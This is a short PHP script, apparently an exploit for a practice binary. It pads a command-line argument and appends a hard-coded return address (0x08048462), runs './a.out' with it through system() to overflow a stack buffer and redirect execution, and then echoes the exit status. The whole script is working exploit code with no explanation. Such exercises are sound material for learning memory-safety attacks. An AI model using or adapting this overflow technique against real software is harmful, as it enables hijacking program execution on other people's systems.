$arg="0000000000000000000000"."\x62\x84\x04\x08";
$cmd="./a.out ".$arg;

system($cmd);
system("echo $?");

